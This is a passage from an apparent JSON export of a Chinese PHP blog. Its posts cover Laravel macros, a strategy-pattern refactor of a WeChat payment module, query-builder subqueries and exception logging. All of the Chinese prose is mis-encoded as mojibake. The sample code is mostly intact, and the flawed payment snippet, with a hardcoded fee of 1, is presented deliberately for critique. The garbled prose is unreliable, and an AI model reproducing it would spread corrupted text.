ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªå«åšmacros.php çš„æ–‡ä»¶ï¼Œç„¶åç¼–è¾‘ composer.json æ·»åŠ ä¸€ä¸ª fileså±æ€§ï¼ˆæ³¨æ„ç›¸å¯¹è·¯å¾„ app/macros.phpï¼‰ï¼š 123456789101112\"autoload\": &#123; \"psr-4\": &#123; \"App\\\\\": \"app/\" &#125;, \"classmap\": [ \"database/seeds\", \"database/factories\" ], \"files\": [ \"app/macros.php\" ]&#125; æœ€åè¿è¡Œ composer dump-autoloaderã€‚ è¿™æ ·æ–°æ·»åŠ çš„æ–‡ä»¶å°†åœ¨è¿è¡Œæ—¶åŠ è½½å’Œæ‰§è¡Œï¼Œæ•´ä¸ªåº”ç”¨éƒ½å¯ä»¥ä½¿ç”¨å…¶ä¸­çš„å®æŒ‡ä»¤ã€‚ åˆ©ç”¨æœåŠ¡æä¾›è€…åˆ›å»ºä¸€ä¸ª ServiceProviderï¼Œå¹¶æ³¨å†Œåœ¨config/app.php ä¸­ï¼Œ æ¯”å¦‚åˆ›å»ºä¸€ä¸ªé›†åˆçš„æœåŠ¡æä¾›è€…ï¼ŒåŠ å…¥boot æ–¹æ³• 1234567891011121314151617&lt;?phpnamespace App\\Providers;use Collection;use Illuminate\\Support\\ServiceProvider;class CollectionMacroServiceProvider extends ServiceProvider &#123; public function boot() &#123; Collection::macro('uppercase', function () &#123; return collect($this-&gt;items)-&gt;map(function ($item) &#123; return strtoupper($item); &#125;); &#125;); &#125;&#125; è¿™æ ·ï¼Œæ•´ä¸ªåº”ç”¨å°±éƒ½å¯ä»¥è®¿é—®åˆ°äº†ã€‚ æœ‰å“ªäº›ç±»å¯ä»¥ä½¿ç”¨Macroä»»ä½•ä½¿ç”¨ Macroable Laravel æ¡†æ¶ä¸­çš„Traits çš„ç±»éƒ½å¯ä»¥ä½¿ç”¨å®ï¼Œæ¯”å¦‚ï¼š Collection Builder Response Rule Request Route HTML Form Filesystem Cache Str Arr Translator â€¦ Macro æ˜¯Laravel ä¸­åˆä¸€å¼ºå¤§è€Œè¢«å¿½è§†çš„å­˜åœ¨ï¼Œåˆç†åœ°ä½¿ç”¨Macro ä»¥å®ç°æ›´å¥½çš„è¡¨è¾¾å’Œå¤ç”¨ã€‚ å‚è€ƒè¿æ¥ å¦‚ä½•åˆ©ç”¨ macro æ–¹æ³•æ¥æ‰©å±• Laravel çš„åŸºç¡€ç±»çš„åŠŸèƒ½ Laravel Tip: 5 examples of why you should be using Macros","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"ä½¿ç”¨ç»„åˆé‡æ„æ”¯ä»˜æ¨¡å—","slug":"reconstruct-the-payment-module-using-a-combination","date":"2021-10-30T01:34:00.000Z","updated":"2021-10-30T01:36:00.489Z","comments":true,"path":"reconstruct-the-payment-module-using-a-combination/","link":"","permalink":"https://www.0x2beace.com/reconstruct-the-payment-module-using-a-combination/","excerpt":"æœ€è¿‘æŠ€æœ¯è€å¤§ç»™æˆ‘ç•™äº†ä¸€ä¸ªè¯¾åä½œä¸šï¼Œæ‰”ç»™æˆ‘ä¸€æ®µä»£ç åï¼Œè®©æˆ‘å†™ä¸€ä¸‹è¿™æ®µä»£ç æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä»¥åŠè¯¥å¦‚ä½•è§£å†³è¿™äº›é—®é¢˜ã€‚","text":"æœ€è¿‘æŠ€æœ¯è€å¤§ç»™æˆ‘ç•™äº†ä¸€ä¸ªè¯¾åä½œä¸šï¼Œæ‰”ç»™æˆ‘ä¸€æ®µä»£ç åï¼Œè®©æˆ‘å†™ä¸€ä¸‹è¿™æ®µä»£ç æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä»¥åŠè¯¥å¦‚ä½•è§£å†³è¿™äº›é—®é¢˜ã€‚ æºç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748 /** * ä½™é¢å……å€¼ */public function pay()&#123; // çœç•¥éªŒå‚éƒ¨åˆ† Db::startTrans(); try &#123; $data['order_no'] = pay_order_no($this-&gt;uId); $data['title'] = $recharge_package-&gt;title; $data['uid'] = $this-&gt;uId; $data['package_id'] = $package_id; $data['money'] = $recharge_package-&gt;money; $data['give_money'] = $recharge_package-&gt;give_money; $data['sum_money'] = $recharge_package-&gt;money+$recharge_package-&gt;give_money; $data['created_at'] = date('Y-m-d H:i:s'); $data['updated_at'] = date('Y-m-d H:i:s'); RechargeOrderModel::create($data); $result = $this-&gt;wechatPay($data); Db::commit(); return $this-&gt;success($result); &#125; catch (\\Exception $exception) &#123; Db::rollback(); return $this-&gt;error($exception-&gt;getMessage()); return $this-&gt;error('æ”¯ä»˜å¤±è´¥'); &#125;&#125;/** * å°ç¨‹åºå¾®ä¿¡æ”¯ä»˜ * @param $data */private function wechatPay($data)&#123; $config = config('pay.wechat'); $config['notify_url'] = request()-&gt;Domain(). '/api/v1.user/wechatNotify'; $open_id = $this-&gt;request-&gt;param(\"open_id\"); $openId = isset($open_id) ? $open_id : UsersModel::where('uid', $data['uid'])-&gt;value('open_id'); $order = [ 'out_trade_no' =&gt; $data['order_no'], 'total_fee' =&gt; $data['money'] 'total_fee' =&gt; 1, 'body' =&gt; 'ä½™é¢å……å€¼', 'openid' =&gt; $openId, ]; return Pay::wechat($config)-&gt;mini($order);&#125; æˆ‘çœ‹åˆ°çš„é—®é¢˜ æ”¯ä»˜éƒ¨åˆ†ä¸å¯å¤ç”¨ã€‚å›è°ƒåœ°å€æ˜¯ç¡¬ç¼–ç ï¼ŒåŠ ä¸Šæ–¹æ³•æ˜¯ç§æœ‰çš„ï¼Œå½“ä¸‹ä¸€æ¬¡å…¶ä»–ä¸šåŠ¡éœ€è¦å¾®ä¿¡æ”¯ä»˜æ—¶ï¼Œåªèƒ½å°†wechatPayæ–¹æ³•æ‰‹åŠ¨å†å¤åˆ¶ä¸€ä»½ã€‚ è€¦åˆè¾ƒé«˜ã€‚RechargeOrderMode::create ä¸ wechatPay æ¥æ”¶çš„æ˜¯åŒä¸€ä¸ªå‚æ•°ã€‚å‰è€…å±äºç³»ç»Ÿä¸šåŠ¡ï¼Œåè€…å±äºç¬¬ä¸‰æ–¹æœåŠ¡ã€‚å¦‚æœå…¶ä»–ä¸šåŠ¡éœ€è¦è°ƒç”¨å¾®ä¿¡æ”¯ä»˜ï¼Œé‚£è°ƒç”¨è€…å°±å¾—æå‰çŸ¥é“wechatPay è¿™ä¸ªæ–¹æ³•æ‰€æ¥æ”¶çš„data å‚æ•°å…·ä½“æ˜¯ä»€ä¹ˆã€‚ wechatPay æ–¹æ³•ç›®å‰åªæ”¯æŒå°ç¨‹åºæ”¯ä»˜ï¼Œå¦‚æœéœ€è¦å¯¹æ¥æ‰«ç æˆ–è€… App æ”¯ä»˜ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šæ‰©å±•èµ·æ¥ä¸æ–¹ä¾¿ã€‚ å¼‚å¸¸æ•è·åˆ°ä¹‹åæ²¡æœ‰è®°å½•ï¼Œè€Œæ˜¯ç›´æ¥æŠ›å‡ºäº†ï¼Œä¸åˆ©äºé—®é¢˜æ’æŸ¥ï¼Œå¦å¤–å°±æ˜¯æœåŠ¡ç«¯å…·ä½“çš„å¼‚å¸¸ä¿¡æ¯æ— éœ€è®©ç”¨æˆ·çŸ¥é“ï¼Œåº”è¯¥æŠ›å‡ºä¹‹å‰å¤„ç†ä¸€ä¸‹ã€‚ è§£å†³æ–¹æ¡ˆæ¶‰åŠæ”¯ä»˜çš„åœ°æ–¹ï¼Œé€šå¸¸éƒ½ä¼šæœ‰è®¢å•ã€‚ åˆ›å»ºè®¢å•å’Œæ”¯ä»˜å¾ˆåƒï¼Œåˆ›å»ºè®¢å•å¯ä»¥æœ‰è´­ä¹°å¥—é¤ã€ä½™é¢å……å€¼ã€å¼€é€šä¼šå‘˜ç­‰ï¼Œè€Œæ”¯ä»˜åˆ™å¯ä»¥æœ‰å°ç¨‹åºæ”¯ä»˜ã€æ‰«ç æ”¯ä»˜ã€App æ”¯ä»˜ç­‰ã€‚ å¯ä»¥ä½¿ç”¨ç­–ç•¥æ¨¡å¼æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ç­–ç•¥æ¨¡å¼ç”¨äºå°†ä¸€ç»„ç®—æ³•ç§»åˆ°ä¸€ä¸ªç‹¬ç«‹çš„ç±»å‹ä¸­ï¼Œç„¶åé€šè¿‡ç®€å•å·¥å‚æ¨¡å¼è·å–å¯¹åº”çš„ç­–ç•¥å¯¹è±¡ã€‚ ä¸‹é¢è¯•ç€æ¥é‡æ„ä¸€ä¸‹ã€‚ å¼€å‘æµç¨‹å¯ä»¥å¤§è‡´åˆ†ä¸ºä»¥ä¸‹ä¸‰å—ï¼š åˆ›å»ºæ”¯ä»˜è®¢å• æ‹‰èµ·æ”¯ä»˜ å›è°ƒ åˆ›å»ºæ”¯ä»˜è®¢å• åˆ›å»ºä¸€ä¸ªæŠ½è±¡ç±» PayOrderStrategyï¼Œå…¶ä¸­å®šä¹‰äº†æŠ½è±¡æ–¹æ³• createOrder()ï¼Œå…¶ç›®çš„åœ¨äºçº¦æŸå­ç±»å®ç°åˆ›å»ºè®¢å•ç­–ç•¥ã€‚ åˆ›å»ºä¸€ä¸ªContextç±»ï¼Œæ˜¾å¼è°ƒç”¨å¦ä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•æ¥æ‰§è¡Œè¯·æ±‚ã€‚Context ç±»å¹¶ä¸è´Ÿè´£åˆ›å»ºè®¢å•ï¼Œå®ƒå°†è¿™ä¸ªä»»åŠ¡äº¤ç»™äº† PayOrderStrategy çš„å®ç°ç±»ã€‚ åˆ›å»ºä¸€ä¸ªè·å–ç­–ç•¥çš„ç®€å•å·¥å‚ï¼Œå…¶ä½œç”¨åœ¨äºæ ¹æ®ä¸åŒçš„ç±»å‹å¯ä»¥è¿”å›å¯¹åº”çš„ç­–ç•¥å¯¹è±¡ã€‚ å®šä¹‰ç­–ç•¥ã€‚æ ¹æ®å®é™…ä¸šåŠ¡åœºæ™¯å°†å¯¹åº”çš„ç®—æ³•ï¼ˆä¸šåŠ¡é€»è¾‘ï¼‰å†™åœ¨å…·ä½“çš„ç­–ç•¥ç±»ä¸­ã€‚ æ–‡ä»¶æ ‘çŠ¶å›¾å¦‚ä¸‹ï¼š 1234567â”œâ”€â”€ PayOrder &#x2F;&#x2F; æ”¯ä»˜è®¢å• Serviceâ”‚ â”œâ”€â”€ PayOrderContext.php &#x2F;&#x2F; è”ç³»ä¸Šä¸‹æ–‡ï¼ˆè°ƒç”¨è€…é€šè¿‡ Context ä½¿ç”¨ç­–ç•¥ï¼‰â”‚ â”œâ”€â”€ PayOrderStrategy.php &#x2F;&#x2F; å®šä¹‰æŠ½è±¡æ–¹æ³•â”‚ â”œâ”€â”€ PayOrderFactory.php &#x2F;&#x2F; è·å–ç­–ç•¥â”‚ â””â”€â”€ Strategy &#x2F;&#x2F; å…·ä½“ç­–ç•¥å®ç°â”‚ â”œâ”€â”€ VipStrategy.php &#x2F;&#x2F; å¼€é€švip ç­–ç•¥â”‚ â”œâ”€â”€ ... &#x2F;&#x2F; å…¶ä»–ç­–ç•¥ å¯ä»¥çœ‹åˆ°ï¼Œè¿™ç§ç»“æ„çš„ä¸€ä¸ªä¼˜ç‚¹æ˜¯å„ä¸ªç±»çš„èŒè´£æ›´åŠ é›†ä¸­ï¼ŒVipStrategy å¯¹è±¡åªè´Ÿè´£åˆ›å»º VIP è®¢å•çš„ç­–ç•¥ï¼ŒPayOrderFactory åªè´Ÿè´£å®ä¾‹åŒ–å¯¹è±¡ï¼ŒPayOrderContext åˆ™åªè´Ÿè´£ç®¡ç†æ”¯ä»˜è®¢å•ã€‚ ç›¸æ¯”åªä½¿ç”¨ç»§æ‰¿ï¼Œç»„åˆå¯¹è±¡èƒ½å¤Ÿä½¿ä»£ç æ›´åŠ çµæ´»ï¼Œå› ä¸ºå¯¹è±¡èƒ½å¤Ÿä»¥å¤šç§æ–¹å¼åŠ¨æ€åœ°ç»„åˆæ¥å¤„ç†ä»»åŠ¡ã€‚ æ‹‰èµ·æ”¯ä»˜æ”¯ä»˜çš„æ ¸å¿ƒé€»è¾‘å’Œä¸Šé¢å·®ä¸å¤šã€‚ æ–‡ä»¶æ ‘çŠ¶å›¾å¦‚ä¸‹ï¼š 12345678910â”œâ”€â”€Payment â”‚ â”œâ”€â”€ PaymentContext.php â”‚ â”œâ”€â”€ PaymentFactory.php â”‚ â”œâ”€â”€ PaymentStrategy.php â”‚ â””â”€â”€ Strategy &#x2F;&#x2F; æ”¯ä»˜ç­–ç•¥â”‚ â”œâ”€â”€ Wechat &#x2F;&#x2F; å¾®ä¿¡æ”¯ä»˜ç­–ç•¥â”‚ â”œâ”€â”€ AppStrategy.php &#x2F;&#x2F; App æ”¯ä»˜â”‚ â”œâ”€â”€ MiniStrategy.php &#x2F;&#x2F; å°ç¨‹åºæ”¯ä»˜â”‚ â”œâ”€â”€ ScanStrategy.php &#x2F;&#x2F; æ‰«ç æ”¯ä»˜â”‚ â”œâ”€â”€ ... &#x2F;&#x2F; å…¶ä»–ç­–ç•¥ å›è°ƒå›è°ƒå°±ä¸ç”¨å¤šè¯´äº†ã€‚ å…·ä½“å®ç°è®¢å•æ¨¡å—PayOrder/PayOrderStrategy.phpï¼š 12345678&lt;?phpnamespace App\\Services\\PayOrder;abstract class PayOrderStrategy&#123; abstract public function createOrder(array $data);&#125; PayOrder/PayOrderContext.phpï¼š 123456789101112131415161718&lt;?phpnamespace App\\Services\\PayOrder;class PayOrderContext&#123; private PayOrderStrategy $strategy; public function __construct(PayOrderStrategy $strategy) &#123; $this-&gt;strategy = $strategy; &#125; public function createOrder(array $data) &#123; return $this-&gt;strategy-&gt;createOrder($data); &#125;&#125; PayOrder/PayOrderFactory.phpï¼š 1234567891011121314151617181920212223&lt;?phpnamespace App\\Services\\PayOrder;use App\\Exceptions\\InvalidRequestException;use App\\Services\\PayOrder\\Strategy\\VipStrategy;class PayOrderFactory&#123; public static function getInstance($orderType) &#123; $map = [ \"vip\" =&gt; new VipStrategy(), // ... ]; if (isset($map[$orderType])) &#123; return $map[$orderType]; &#125; throw new InvalidRequestException(\"è®¢å•ç±»å‹ä¸å­˜åœ¨\"); &#125;&#125; PayOrder/Strategy/VipStrategy.phpï¼š 123456789101112131415161718192021222324252627&lt;?phpnamespace App\\Services\\PayOrder\\Strategy;use App\\Services\\PayOrder\\PayOrderStrategy;class VipStrategy extends PayOrderStrategy&#123; public function createOrder(array $data) &#123; /** * 1. åˆ›å»ºè®¢å• * 2. å¼‚å¸¸æ•è·åŠäº‹åŠ¡å›æ»šï¼Œå¦‚æœåˆ›å»ºå¤±è´¥ï¼Œç›´æ¥æŠ›å‡º * 3. ç»„è£…å¹¶è¿”å›æ”¯ä»˜å‚æ•° */ // æ”¯ä»˜æ‰€éœ€å‚æ•° return [ 'out_trade_no' =&gt; \"\", 'total_fee' =&gt; \"\", 'body' =&gt; \"\", 'openid' =&gt; \"\", // VIP æ”¯ä»˜å›è°ƒåœ°å€ 'notify_url' =&gt; \"\", ]; &#125;&#125; æ”¯ä»˜æ¨¡å—Payment/PaymentStrategy.phpï¼š 12345678&lt;?phpnamespace App\\Services\\Payment;interface PaymentStrategy&#123; public function pay(array $order);&#125; Payment/PaymentContext.phpï¼š 123456789101112131415161718&lt;?phpnamespace App\\Services\\Payment;class PaymentContext&#123; private PaymentStrategy $strategy; public function __construct(PaymentStrategy $strategy) &#123; $this-&gt;strategy = $strategy; &#125; public function pay(array $order) &#123; return $this-&gt;strategy-&gt;pay($order); &#125;&#125; Payment/PaymentFactoryï¼š 1234567891011121314151617181920212223242526&lt;?phpnamespace App\\Services\\Payment;use App\\Services\\Payment\\Strategy\\Wechat\\AppStrategy;use App\\Services\\Payment\\Strategy\\Wechat\\MiniStrategy;use App\\Services\\Payment\\Strategy\\Wechat\\ScanStrategy;use Yansongda\\Pay\\Exceptions\\BusinessException;class PaymentFactory&#123; public static function getInstance($payType) &#123; $map = [ \"mini\" =&gt; new MiniStrategy(), \"app\" =&gt; new AppStrategy(), \"scan\" =&gt; new ScanStrategy(), ]; if (isset($map[$payType])) &#123; return $map[$payType]; &#125; throw new BusinessException(\"å¾®ä¿¡æ”¯ä»˜ç±»å‹é”™è¯¯\"); &#125;&#125; Payment/Strategy/Wechat/MiniStrategy.phpï¼š 12345678910111213141516171819202122&lt;?phpnamespace App\\Services\\Payment\\Strategy\\Wechat;use App\\Services\\Payment\\PaymentStrategy;use Yansongda\\Pay\\Pay;class MiniStrategy implements PaymentStrategy&#123; public function pay(array $data) &#123; $config = config('pay.wechat'); $config['notify_url'] = env('HOST') . $data[\"notify_url\"]; $order = [ 'out_trade_no' =&gt; $data[\"order_no\"], 'total_fee' =&gt; $data['price'], 'body' =&gt; $data[\"body\"], 'openid' =&gt; $data[\"open_id\"], ]; return Pay::wechat($config)-&gt;miniapp($order); &#125;&#125; Payment/Strategy/Wechat/AppStrategyï¼š 12345678910111213&lt;?phpnamespace App\\Services\\Payment\\Strategy\\Wechat;use App\\Services\\Payment\\PaymentStrategy;class AppStrategy implements PaymentStrategy&#123; public function pay(array $order) &#123; // TODO: Implement pay() method. &#125;&#125; å®¢æˆ·ç«¯è°ƒç”¨123456789101112131415161718192021222324public function pay(VipPackageRequest $request) &#123; /** * 1. éªŒå‚ * 2. ç»„è£…å‚æ•° * 3. åˆ›å»ºVIP å¥—é¤è®¢å• * 4. æ”¯ä»˜ */ $params = $request-&gt;all(); $data = []; try &#123; $orderStrategy = PayOrderFactory::getInstance(\"vip\"); $order = (new PayOrderContext($orderStrategy))-&gt;createOrder($data); // $params[\"pay_type\"] å¯ä»¥æ˜¯å°ç¨‹åºæ”¯ä»˜ã€App æ”¯ä»˜ã€æ‰«ç æ”¯ä»˜ $paymentStrategy = PaymentFactory::getInstance($params[\"pay_type\"]); $result = (new PaymentContext($paymentStrategy))-&gt;pay($order); return $this-&gt;success($result); &#125; catch (\\Exception $exception) &#123; throw new InternalException($exception-&gt;getMessage(), $exception); &#125; &#125; è¿™é‡Œä»…ä»…åªæ˜¯å°±è®¢å•å’Œæ”¯ä»˜æ¨¡å—ï¼Œç®€å•é‡æ„äº†ä¸‹ï¼Œä»æœ‰ä¸è¶³çš„åœ°æ–¹ï¼Œï¼ˆæ¯”å¦‚ç°åœ¨éœ€è¦åŠ å…¥æ”¯ä»˜å®æˆ–è€…é“¶è¡Œå¡æ”¯ä»˜ï¼‰è¿˜éœ€è¦ä¸æ–­å®Œå–„ã€‚ å®é™…é¡¹ç›®å¾€å¾€æ¯”è¿™ä¸ªåœºæ™¯è¦å¤æ‚ï¼Œéœ€è¦è€ƒè™‘çš„ä¸œè¥¿æ›´å¤šã€‚","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"è®¾è®¡æ¨¡å¼","slug":"PHP/è®¾è®¡æ¨¡å¼","permalink":"https://www.0x2beace.com/categories/PHP/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"è®¾è®¡æ¨¡å¼","slug":"è®¾è®¡æ¨¡å¼","permalink":"https://www.0x2beace.com/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}]},{"title":"å¦‚ä½•åœ¨ Laravel ä¸­ä½¿ç”¨å­æŸ¥è¯¢","slug":"how-to-use-subqueries-in-laravel","date":"2021-10-17T11:16:38.000Z","updated":"2021-10-17T11:17:26.027Z","comments":true,"path":"how-to-use-subqueries-in-laravel/","link":"","permalink":"https://www.0x2beace.com/how-to-use-subqueries-in-laravel/","excerpt":"è¿™é‡Œå¹¶ä¸è®¨è®ºå­æŸ¥è¯¢çš„æ•ˆç‡é—®é¢˜ï¼Œè€Œæ˜¯å•å°±å¦‚ä½•åœ¨Laravel ä¸­ä½¿ç”¨å­æŸ¥è¯¢å±•å¼€è®¨è®ºã€‚","text":"è¿™é‡Œå¹¶ä¸è®¨è®ºå­æŸ¥è¯¢çš„æ•ˆç‡é—®é¢˜ï¼Œè€Œæ˜¯å•å°±å¦‚ä½•åœ¨Laravel ä¸­ä½¿ç”¨å­æŸ¥è¯¢å±•å¼€è®¨è®ºã€‚ ä½¿ç”¨å­æŸ¥è¯¢æ—¶ï¼Œå¿…é¡»éµå¾ªä»¥ä¸‹è§„åˆ™ï¼š å­æŸ¥è¯¢å¿…é¡»æ‹¬åœ¨åœ†æ‹¬å·ä¸­ å­æŸ¥è¯¢çš„ SELECT å­å¥ä¸­åªèƒ½æœ‰ä¸€ä¸ªåˆ—ï¼Œé™¤éä¸»æŸ¥è¯¢ä¸­æœ‰å¤šä¸ªåˆ—ï¼Œç”¨äºä¸å­æŸ¥è¯¢é€‰ä¸­çš„åˆ—ç›¸æ¯”è¾ƒ å­æŸ¥è¯¢ä¸èƒ½ä½¿ç”¨ ORDER BYï¼Œä¸è¿‡ä¸»æŸ¥è¯¢å¯ä»¥ã€‚åœ¨å­æŸ¥è¯¢ä¸­ï¼ŒGROUP BY å¯ä»¥èµ·åˆ°åŒ ORDER BY ç›¸åŒçš„ä½œç”¨ è¿”å›å¤šè¡Œæ•°æ®çš„å­æŸ¥è¯¢åªèƒ½åŒå¤šå€¼æ“ä½œç¬¦ä¸€èµ·ä½¿ç”¨ï¼Œæ¯”å¦‚ IN æ“ä½œç¬¦ SELECT åˆ—è¡¨ä¸­ä¸èƒ½åŒ…å«ä»»ä½•å¯¹ BLOBã€ARRAYã€CLOB æˆ–è€… NCLOB ç±»å‹å€¼çš„å¼•ç”¨å­æŸ¥è¯¢ä¸èƒ½ç›´æ¥ç”¨åœ¨é›†åˆå‡½æ•°ä¸­ BETWEEN æ“ä½œç¬¦ä¸èƒ½åŒå­æŸ¥è¯¢ä¸€èµ·ä½¿ç”¨ï¼Œä½†æ˜¯ BETWEEN æ“ä½œç¬¦å¯ä»¥ç”¨åœ¨å­æŸ¥è¯¢ä¸­ åœ¨Laravel ä¸­åˆ›å»ºå­æŸ¥è¯¢æœ‰ä¸¤ç§æ–¹å¼ï¼š æ„å»º raw è¯­å¥ ä½¿ç”¨æŸ¥è¯¢æ„é€ å™¨çš„é—­åŒ… æ–¹å¼ä¸€1234$sub = UserAccountModel::selectRaw(\"max(balance) as balance\");$result = UserAccountModel::whereRaw(\"balance = (&#123;$sub-&gt;toSql()&#125;)\") -&gt;mergeBindings($sub-&gt;getQuery()) -&gt;first(); è¿™é‡Œç”¨åˆ°äº†å‡ ä¸ªAPIï¼š1. toSql() è·å–ä¸å¸¦ binding å‚æ•°çš„ SQL è¯­å¥ï¼ˆé€šå¸¸æ˜¯å¸¦é—®å·çš„SQLï¼‰ï¼š 1&quot;select max(balance) as balance from &#96;user_account&#96;&quot; 2. getQuery() è·å– binding å‚æ•°ï¼š 12345678910111213141516171819202122232425Illuminate\\Database\\Query\\Builder &#123;#1015 â–¼ +connection: Illuminate\\Database\\MySqlConnection &#123;#982 â–¶&#125; +grammar: Illuminate\\Database\\Query\\Grammars\\MySqlGrammar &#123;#983 â–¶&#125; +processor: Illuminate\\Database\\Query\\Processors\\MySqlProcessor &#123;#984&#125; +bindings: array:9 [â–¶] +aggregate: null +columns: array:1 [â–¶] +distinct: false +from: \"user_account\" +joins: null +wheres: [] +groups: null +havings: null +orders: null +limit: null +offset: null +unions: null +unionLimit: null +unionOffset: null +unionOrders: null +lock: null +beforeQueryCallbacks: [] +operators: array:30 [â–¶] +useWritePdo: false&#125; 3. mergeBindings() å°† binding å‚æ•°åˆå¹¶åˆ°æŸ¥è¯¢ä¸­ æœ€ç»ˆè·å¾—SQL å¦‚ä¸‹ï¼š 1select * from &#96;user_account&#96; where &#96;balance&#96; &#x3D; (select max(balance) as balance from &#96;user_account&#96; limit 1) limit 1 æ–¹å¼äºŒç›´æ¥ä½¿ç”¨æŸ¥è¯¢æ„é€ å™¨è‡ªå¸¦çš„é—­åŒ…æŸ¥è¯¢ï¼š 12345$result = UserAccountModel::where(\"balance\", function ($query)&#123; $query-&gt;selectRaw(\"max(balance) as balance\") -&gt;from(\"user_account\") -&gt;value(\"balance\");&#125;)-&gt;first(); æœ€ç»ˆè·å¾—SQL å¦‚ä¸‹ï¼š 1select * from `user_account` where `balance` = (select max(balance) as balance from `user_account` limit 1) limit 1","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"Laravel å®Œå–„ Error/Exception çš„æ•è·ä¸å¤„ç†","slug":"laravel-improves-error-exception-capture-and-handling","date":"2021-08-29T08:19:29.000Z","updated":"2021-08-29T08:21:24.127Z","comments":true,"path":"laravel-improves-error-exception-capture-and-handling/","link":"","permalink":"https://www.0x2beace.com/laravel-improves-error-exception-capture-and-handling/","excerpt":"å‰ç«¯æ—¶é—´ï¼Œçº¿ä¸Šçš„ç®¡ç†åå°çš„æŸä¸ªåŠŸèƒ½çªç„¶è¢«å‘ŠçŸ¥æ— æ³•æ­£å¸¸ä½¿ç”¨ã€‚","text":"å‰ç«¯æ—¶é—´ï¼Œçº¿ä¸Šçš„ç®¡ç†åå°çš„æŸä¸ªåŠŸèƒ½çªç„¶è¢«å‘ŠçŸ¥æ— æ³•æ­£å¸¸ä½¿ç”¨ã€‚ æŠ›å‡ºçš„å¼‚å¸¸å¦‚ä¸‹ï¼š Trying to access array offset on value of type null åˆæ­¥åˆ¤å®šå°±æ˜¯å› ä¸ºæŸä¸ªæ•°ç»„æˆ–è€…å¯¹è±¡çš„å€¼ä¸ºnullï¼Œä½†æ˜¯ä¸ç¡®å®šå…·ä½“æ˜¯å“ªä¸€è¡Œä»£ç æ‰€å¯¼è‡´ã€‚ äºæ˜¯é©¬ä¸Šæ‰“å¼€laravel.log ç³»ç»Ÿæ—¥å¿—æ–‡ä»¶ï¼Œæƒ³ä»è¿™é‡Œç«™ç‰Œæ‰¾åˆ°å¼‚å¸¸åŸå› ã€‚ æ‰¾éæ•´ä¸ªæ–‡ä»¶éƒ½æ²¡æœ‰å‘ç°ç›¸å…³å­—çœ¼ï¼Œè¿™æ—¶æˆ‘æ‰æ„è¯†åˆ°ï¼Œæœ¬æ¥Laravel å¯¹äºè¿è¡Œæ—¶é”™è¯¯ï¼Œæ˜¯ä¼šè¿›è¡Œè®°å½•çš„ï¼Œä½†æ˜¯æˆ‘å°†å¼‚å¸¸æ•è·åˆ°ä¹‹åï¼Œå¹¶æ²¡æœ‰å†™å…¥æ—¥å¿—æ–‡ä»¶ï¼Œè€Œæ˜¯ç›´æ¥è¿”å›ç»™å®¢æˆ·ç«¯äº†â€¦ æ˜¾ç„¶è¿™å¯¹äºåé¢æ’æŸ¥é—®é¢˜ç›¸å½“ä¸æ–¹ä¾¿ï¼Œæ‰€ä»¥å¿…é¡»åšç‚¹ä»€ä¹ˆï¼Œå°†å¼‚å¸¸ä¿¡æ¯ç»™ä¿å­˜èµ·æ¥ã€‚ PHP ç³»ç»Ÿçº§ç”¨æˆ·ä»£ç çš„é”™è¯¯ç±»å‹æœ‰ä¸¤ç§ï¼Œå¯ç”± try ... catch ... è¿›è¡Œæ•è·ã€‚ E_PARSEï¼šè§£ææ—¶é”™è¯¯ï¼ˆè¯­æ³•è§£æé”™è¯¯ï¼‰é€šå¸¸å› ä¸ºå°‘ä¸ªåˆ†å·ã€å¤šä¸ªé€—å·ä¹‹ç±»çš„é—®é¢˜å¯¼è‡´çš„è‡´å‘½é”™è¯¯ E_ERRORï¼šè¿è¡Œæ—¶é”™è¯¯ï¼Œé€šå¸¸æ˜¯å› ä¸ºè°ƒç”¨äº†æœªå®šä¹‰çš„å‡½æ•°æˆ–æ–¹æ³•è€Œå¼•å‘çš„è‡´å‘½é”™è¯¯ã€‚ åƒæ–‡ç« å¼€å¤´çš„é‚£ä¸ªå¼‚å¸¸ï¼Œå°±å±äºï¼šè¿è¡Œæ—¶é”™è¯¯ã€‚è¿™ç±»å¼‚å¸¸æ­£æ˜¯æˆ‘ä»¬éœ€è¦æ•è·å¹¶è®°å½•çš„ã€‚ å› ä¸ºç›®å‰çš„ä»£ç å·²ç»å®ç°äº†ï¼Œæ•è·ç³»ç»Ÿå¼‚å¸¸å¹¶è¿”å›ç»™å®¢æˆ·ç«¯ç­‰ç›¸å…³åŠŸèƒ½ï¼Œæ‰€ä»¥å‰©ä¸‹éœ€è¦å®Œæˆçš„å°±åªæ˜¯å†™å…¥æ—¥å¿—æ–‡ä»¶ã€‚ ç”±äºå¹¶ä¸æ˜¯æ‰€æœ‰å¼‚å¸¸éƒ½éœ€è¦è®°å½•ï¼Œæ¯”å¦‚ç”±ç”¨æˆ·è¡Œä¸ºè€Œé€ æˆçš„å¼‚å¸¸ï¼Œå°±æ— éœ€é¢å¤–è®°å½•ï¼Œæ‰€ä»¥æœ€ç»ˆå®ç°å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpnamespace App\\Exceptions;use 